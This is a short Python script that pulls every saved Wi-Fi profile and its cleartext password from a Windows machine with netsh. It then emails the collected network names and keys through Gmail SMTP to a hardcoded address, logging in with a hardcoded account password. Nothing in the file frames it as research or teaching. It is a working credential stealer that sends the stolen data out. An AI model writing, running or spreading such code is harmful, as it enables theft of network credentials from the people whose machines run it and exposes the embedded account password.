import smtplib,subprocess,re


def sendMail(email,password,message):
    server = smtplib.SMTP('smtp.gmail.com',587)
    server.starttls()
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def getWifi():
    wifiNetworks = []
    wlanProfile = 'netsh wlan show profile'
    wlanProfile = subprocess.check_output(wlanProfile,shell=True)
    wlanProfile = wlanProfile.decode()
    #print(wlanProfile)
    if 'Profile' in str(wlanProfile):
        netNames = re.compile('(Profile\s*:\s)(.*)')
        netNames = re.findall(netNames,str(wlanProfile))
        for profile in netNames:
            
            wifiNet = profile[1].strip()
            #print(wifiNet)
            wifiNetworks.append(wifiNet)
            
        
    return wifiNetworks

#print(getWifi())
def getPass():
    passwords = []

    for network in getWifi():
        #print(network)
        cmd = 'netsh wlan show profile ' + network + ' key=clear'
        #print(cmd)
        wlanProfile = subprocess.check_output(cmd)
        wlanProfile = wlanProfile.decode()
        getPass = re.compile(r'(Key Content\s*:)(.*)')
        reGroups = getPass.findall(wlanProfile)[-1]
        password = (reGroups[-1])
        password = password.strip()
        passwords.append(password)
    
    return passwords
#print(getPass())

result = zip(getWifi(),getPass())
result = (list(result))


sendMail('benpro4433@gmail.com','burn3rp4ss',result)

